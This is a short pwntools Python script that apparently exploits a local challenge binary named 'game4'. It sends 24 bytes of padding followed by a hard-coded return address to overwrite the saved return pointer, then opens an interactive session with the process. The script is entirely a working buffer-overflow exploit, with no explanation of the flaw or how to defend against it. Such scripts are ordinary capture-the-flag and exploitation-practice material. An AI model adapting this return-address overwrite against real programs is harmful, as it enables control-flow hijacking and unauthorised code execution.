from pwn import *
context.log_level = 'debug'
p = process('./game4')
e = ELF('./game4')


#gdb.attach(p)

payload = b"A" * 24 + b"\x69\x52\x55\x55\x55\x55\x00\x00"
encoded = base64.b64encode(payload)
print(encoded)

#payload = b'aa'
pause()
p.sendline(payload)



p.interactive()